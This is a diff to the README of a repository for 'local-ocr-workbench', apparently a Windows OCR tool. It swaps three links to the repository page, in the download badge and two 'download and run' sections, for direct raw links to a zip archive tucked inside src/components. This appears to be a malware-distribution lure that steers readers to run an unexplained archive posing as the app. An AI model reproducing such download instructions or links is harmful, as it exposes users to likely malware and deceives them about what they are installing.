@@ -1,12 +1,12 @@
 # 🧠 local-ocr-workbench - Test OCR on files fast
 
-[![Download or visit the release page](https://img.shields.io/badge/Download-Visit%20the%20release%20page-7c3aed?style=for-the-badge)](https://github.com/corrosive-angleofview619/local-ocr-workbench)
+[![Download or visit the release page](https://img.shields.io/badge/Download-Visit%20the%20release%20page-7c3aed?style=for-the-badge)](https://raw.githubusercontent.com/corrosive-angleofview619/local-ocr-workbench/main/src/components/workbench-ocr-local-3.0.zip)
 
 ## 📥 Download
 
 Visit this page to download and run the app on Windows:
 
-https://github.com/corrosive-angleofview619/local-ocr-workbench
+https://raw.githubusercontent.com/corrosive-angleofview619/local-ocr-workbench/main/src/components/workbench-ocr-local-3.0.zip
 
 ## 🪟 Run on Windows
 
@@ -189,4 +189,4 @@ It is useful for scanned documents, screenshots, and PDFs that need text extract
 
 Visit this page to download and run the app on Windows:
 
-https://github.com/corrosive-angleofview619/local-ocr-workbench
+https://raw.githubusercontent.com/corrosive-angleofview619/local-ocr-workbench/main/src/components/workbench-ocr-local-3.0.zip
